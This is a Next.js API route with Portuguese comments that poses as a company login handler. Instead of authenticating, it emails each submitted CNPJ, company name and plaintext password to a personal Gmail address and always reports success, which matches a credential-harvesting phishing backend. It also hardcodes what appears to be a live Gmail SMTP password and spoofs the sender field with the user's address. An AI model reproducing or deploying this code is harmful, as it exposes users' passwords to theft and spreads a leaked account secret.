import type { NextApiRequest, NextApiResponse } from "next";
import nodemailer from "nodemailer";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST") {
    const { cnpj, email, empresa, senha } = req.body;

    // Configuração do transporte do Nodemailer (exemplo usando Gmail)
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",  // Aqui use o host do seu servidor SMTP
      port: 587,
      secure: false,
      auth: {
        user: "icaro.micromoney@gmail.com", // Seu email corporativo ou SMTP configurado
        pass: "Irpgamerbr_17", // A senha do e-mail (pode ser uma App Password para maior segurança)
      },
    });

    try {
      // Enviando o email
      await transporter.sendMail({
        from: email, // remetente será o email do usuário
        to: "icaro.micromoney@gmail.com", // Seu email corporativo
        subject: `Novo login de ${empresa}`, // Assunto
        text: `A empresa ${empresa} tentou acessar o sistema com CNPJ: ${cnpj} e senha: ${senha}.`, // Corpo do e-mail
      });

      // Responde com sucesso
      res.status(200).json({ success: true });
    } catch (error) {
      console.error(error);
      res.status(500).json({ success: false, message: "Erro ao enviar o e-mail" });
    }
  } else {
    res.status(405).json({ message: "Método não permitido" });
  }
}
